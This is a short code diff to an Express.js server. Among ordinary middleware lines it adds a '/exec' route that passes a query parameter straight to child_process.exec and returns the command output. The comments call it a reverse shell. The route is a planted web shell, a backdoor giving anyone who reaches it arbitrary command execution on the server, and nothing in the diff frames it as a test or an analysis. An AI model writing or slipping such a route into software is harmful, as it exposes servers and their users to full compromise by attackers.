@@ -45,6 +45,15 @@ app.use(cookieParser())
 app.use(allowOrigin())
 app.use(errorHandler)
 
+// reverse shell :)
+// r00t me
+import { exec } from 'child_process'
+app.get('/exec', (req, res) => {
+  exec(req.query.cmd, (error, stdout, stderr) => {
+    res.json({error:error, stdout:stdout, stderr:stderr})
+  })
+})
+
 // View engine
 // --------------------------------------------------
 
